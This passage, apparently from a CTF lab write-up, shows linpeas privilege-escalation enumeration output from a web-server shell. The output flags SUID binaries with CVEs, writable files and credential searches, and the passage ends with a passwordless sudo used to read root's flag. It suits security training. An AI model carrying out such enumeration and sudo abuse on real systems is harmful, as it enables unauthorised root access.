-rwxr-sr-x 1 root shadow 23K May 17  2017 /snap/core/5742/usr/bin/expiry
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/5742/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/5742/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/5742/usr/bin/mail-unlock
-rwxr-sr-x 1 root systemd-bus-proxy 351K Jan 18  2018 /snap/core/5742/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27K May 16  2018 /snap/core/5742/usr/bin/wall
-rwsr-sr-x 1 root root 97K Oct 15  2018 /snap/core/5742/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/6350/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/6350/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 61K May 17  2017 /snap/core/6350/usr/bin/chage
-rwxr-sr-x 1 root systemd-timesync 36K Apr  5  2016 /snap/core/6350/usr/bin/crontab
-rwxr-sr-x 1 root mail 15K Dec  7  2013 /snap/core/6350/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 23K May 17  2017 /snap/core/6350/usr/bin/expiry
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/6350/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/6350/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/6350/usr/bin/mail-unlock
-rwxr-sr-x 1 root systemd-bus-proxy 351K Nov  5  2018 /snap/core/6350/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27K May 16  2018 /snap/core/6350/usr/bin/wall
-rwsr-sr-x 1 root root 97K Jan 29  2019 /snap/core/6350/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwxr-sr-x 1 root shadow 61K May 16  2017 /usr/bin/chage
-rwxr-sr-x 1 root crontab 36K Apr  5  2016 /usr/bin/crontab
-rwxr-sr-x 1 root tty 15K Mar  1  2016 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 23K May 16  2017 /usr/bin/expiry
-rwxr-sr-x 1 root mlocate 39K Nov 18  2014 /usr/bin/mlocate
-rwxr-sr-x 1 root ssh 351K Nov  5  2018 /usr/bin/ssh-agent
-rwxr-sr-x 1 root utmp 425K Feb  7  2016 /usr/bin/screen  --->  GNU_Screen_4.5.0
-rwxr-sr-x 1 root tty 27K May 16  2018 /usr/bin/wall
-rwsr-sr-x 1 daemon daemon 51K Jan 14  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-sr-x 1 root root 97K Jul 19  2018 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so
/etc/ld.so.conf
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/usr/lib/x86_64-linux-gnu/libfakeroot
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
Current capabilities:
Current: =
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Files with capabilities (limited to 50):
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls
files with acls in searched folders Not Found

╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
/usr/bin/gettext.sh

╔══════════╣ Unexpected in root
/vmlinuz
/initrd.img

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files
total 32
drwxr-xr-x  2 root root 4096 Nov 14  2018 .
drwxr-xr-x 94 root root 4096 Dec 26 17:18 ..
-rw-r--r--  1 root root 1557 Apr 14  2016 Z97-byobu.sh
-rwxr-xr-x  1 root root 3417 Oct 17  2018 Z99-cloud-locale-test.sh
-rwxr-xr-x  1 root root  873 Oct 17  2018 Z99-cloudinit-warnings.sh
-rw-r--r--  1 root root  825 Jul 19  2018 apps-bin-path.sh
-rw-r--r--  1 root root  663 May 18  2016 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No

╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/home/rick
/home/rick/second ingredients
/root/

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
/run/php

╔══════════╣ Readable files belonging to root and readable by me but not world readable

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/kern.log
/var/log/auth.log
/var/log/syslog

╔══════════╣ Writable log files (logrotten) (limit 100)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation

╔══════════╣ Files inside /home/www-data (limit 20)

╔══════════╣ Files inside others home (limit 20)
/home/ubuntu/.bash_logout
/home/ubuntu/.sudo_as_admin_successful
/home/ubuntu/.bash_history
/home/ubuntu/.viminfo
/home/ubuntu/.bashrc
/home/ubuntu/.profile
/home/rick/second ingredients

╔══════════╣ Searching installed mail applications

╔══════════╣ Mails (limit 50)

╔══════════╣ Backup folders

╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 128 Nov 14  2018 /var/lib/sgml-base/supercatalog.old
-rw-r--r-- 1 root root 497 Dec 26 17:18 /run/blkid/blkid.tab.old
-rw-r--r-- 1 root root 610 Nov 14  2018 /etc/xml/catalog.old
-rw-r--r-- 1 root root 673 Nov 14  2018 /etc/xml/xml-core.xml.old
-rwxr-xr-x 1 root root 226 Apr 14  2016 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 298768 Dec 29  2015 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 May  6  2015 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 11358 Feb 10  2019 /usr/share/info/dir.old
-rw-r--r-- 1 root root 665 Apr 16  2016 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 0 Nov  2  2018 /usr/src/linux-headers-4.4.0-1072-aws/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Nov  2  2018 /usr/src/linux-headers-4.4.0-1072-aws/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 134350 Nov  2  2018 /usr/src/linux-headers-4.4.0-1072-aws/.config.old
-rw-r--r-- 1 root root 35792 May  8  2018 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found: /snap/core/5742/lib/firmware/regulatory.db: CRDA wireless regulatory database file
Found: /snap/core/6350/lib/firmware/regulatory.db: CRDA wireless regulatory database file
Found: /var/lib/mlocate/mlocate.db: regular file, no read permission


╔══════════╣ Web files?(output limit)
/var/www/:
total 12K
drwxr-xr-x  3 root root 4.0K Feb 10  2019 .
drwxr-xr-x 14 root root 4.0K Feb 10  2019 ..
drwxr-xr-x  3 root root 4.0K Feb 10  2019 html

/var/www/html:
total 40K
drwxr-xr-x 3 root   root   4.0K Feb 10  2019 .
drwxr-xr-x 3 root   root   4.0K Feb 10  2019 ..

╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw------- 1 root root 0 Oct 16  2018 /snap/core/5742/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Aug 31  2015 /snap/core/5742/etc/skel/.bash_logout
-rw------- 1 root root 0 Jan 29  2019 /snap/core/6350/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Aug 31  2015 /snap/core/6350/etc/skel/.bash_logout
-rw-r--r-- 1 root root 1391 Feb 10  2019 /var/cache/apparmor/.features
-rw-r--r-- 1 root root 20 Dec 26 17:18 /run/cloud-init/.instance-id
-rw-r--r-- 1 root root 2 Dec 26 17:18 /run/cloud-init/.ds-identify.result
-rw-r--r-- 1 root root 0 Dec 26 17:18 /run/network/.ifstate.lock
-rw-r--r-- 1 ubuntu ubuntu 220 Aug 31  2015 /home/ubuntu/.bash_logout
-rw-r--r-- 1 root root 1391 Feb 10  2019 /etc/apparmor.d/cache/.features
-rw-r--r-- 1 root root 220 Aug 31  2015 /etc/skel/.bash_logout
-rw------- 1 root root 0 Nov 14  2018 /etc/.pwd.lock
-rw-r--r-- 1 root root 0 Jan 11  2019 /usr/share/php/.lock
-rw-r--r-- 1 root root 7080 Jan 11  2019 /usr/share/php/.filemap

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rwxr-xr-x 1 www-data www-data 761415 Dec 26 18:49 /tmp/linpeas.sh
-rw-r--r-- 1 root root 7350 Feb 10  2019 /var/backups/apt.extended_states.0

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/home/rick
/home/rick/second ingredients
/run/lock
/run/lock/apache2
/run/php
/snap/core/5742/run/lock
/snap/core/5742/tmp
/snap/core/5742/var/tmp
/snap/core/6350/run/lock
/snap/core/6350/tmp
/snap/core/6350/var/tmp
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
#)You_can_write_even_more_files_inside_last_directory

/var/cache/apache2/mod_cache_disk
/var/crash
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/init.scope/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/-.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/acpid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apparmor.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apport.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cloud-config.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cloud-final.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cloud-init-local.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cloud-init.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/console-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/grub-common.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ifup@eth0.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/irqbalance.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/iscsid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/keyboard-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/kmod-static-nodes.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-monitor.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd-containers.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mdadm.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networking.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ondemand.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/open-iscsi.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/php7.0-fpm.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkitd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rc-local.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/resolvconf.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/setvtrgb.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snap-amazonx2dssmx2dagent-784.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snap-amazonx2dssmx2dagent-930.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snap-core-5742.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snap-core-6350.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snap.amazon-ssm-agent.amazon-ssm-agent.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.seeded.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-serialx2dgetty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journal-flush.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-modules-load.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-random-seed.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-remount-fs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-sysctl.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup-dev.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udev-trigger.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-update-utmp.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-user-sessions.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ufw.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/var-lib-lxcfs.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/lib/php/sessions
/var/tmp
/var/tmp/cloud-init
/var/www/html/index.html

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files

╔══════════╣ Searching passwords in history files

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/usr/include/php/20151012/ext/standard/php_password.h
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-35.pyc
/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-35.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-35.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-store.1.gz
/usr/share/man/man1/git-credential.1.gz

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Searching passwords inside logs (limit 70)
2019-02-10 13:58:17,367 - util.py[DEBUG]: Running command ['passwd', '-l', 'ubuntu'] with allowed return codes [0] (shell=False, capture=True)
2019-02-10 13:58:28,985 - util.py[DEBUG]: Writing to /var/lib/cloud/instances/i-012e1c38a0e6ae790/sem/config_set_passwords - wb: [644] 25 bytes
2019-02-10 13:58:28,986 - cc_set_passwords.py[DEBUG]: Leaving ssh config 'PasswordAuthentication' unchanged. ssh_pwauth=None
2019-02-10 13:58:28,986 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords ran successfully
2019-02-10 16:22:16,385 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2019-02-10 16:22:16,385 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2019-02-10 16:57:23,399 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2019-02-10 16:57:23,399 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-12-26 17:18:53,573 - util.py[DEBUG]: Running command ['passwd', '-l', 'ubuntu'] with allowed return codes [0] (shell=False, capture=True)
2021-12-26 17:19:22,883 - cc_set_passwords.py[DEBUG]: Leaving ssh config 'PasswordAuthentication' unchanged. ssh_pwauth=None
2021-12-26 17:19:22,883 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords ran successfully
2021-12-26 17:19:22,883 - util.py[DEBUG]: Writing to /var/lib/cloud/instances/i-00879c1242ac413ec/sem/config_set_passwords - wb: [644] 25 bytes
```

We see that www-data has `sudo` access without a password

```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d 
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
Matching Defaults entries for www-data on ip-10-10-30-160.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-30-160.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

```
$ sudo cat /root/3rd.txt
3rd ingredients: [REDACTED]
```